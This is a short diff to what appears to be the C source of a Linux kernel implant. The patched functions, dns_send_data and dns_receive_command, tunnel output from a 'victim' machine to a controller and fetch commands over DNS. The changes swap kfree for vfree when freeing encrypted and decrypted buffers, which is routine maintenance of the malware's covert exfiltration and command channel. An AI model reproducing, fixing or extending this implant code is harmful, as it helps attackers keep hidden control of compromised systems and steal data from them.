@@ -155,7 +155,7 @@ int dns_send_data(const char *data, size_t data_len) {
 
     // Too many chunks, refuse to send, arbitrarily limit to DNS_MAX_AUTHORIZED_NB_CHUNKS
     if (total_chunks > DNS_MAX_AUTHORIZED_NB_CHUNKS) {
-        kfree(encrypted_msg);
+        vfree(encrypted_msg);
         dns_send_data("Output on victim side too big. Use TCP instead. ", 47);
         return -E2BIG;
     }
@@ -167,7 +167,7 @@ int dns_send_data(const char *data, size_t data_len) {
     // Allocate local response buffer
     response_buffer_local = kzalloc(DNS_MAX_BUF, GFP_KERNEL);
     if (!response_buffer_local) {
-        kfree(encrypted_msg);
+        vfree(encrypted_msg);
         return -ENOMEM;
     }
 
@@ -198,7 +198,7 @@ int dns_send_data(const char *data, size_t data_len) {
     }
 
     // Marie Kondo
-    kfree(encrypted_msg);
+    vfree(encrypted_msg);
     kfree(response_buffer_local);
     return 0;
 }
@@ -288,7 +288,7 @@ int dns_receive_command(char *out_buffer, size_t max_length) {
 
         // Marie Kondo
         kfree(response_buffer_local);
-        kfree(decrypted);
+        vfree(decrypted);
         return decrypted_len;
     }
 
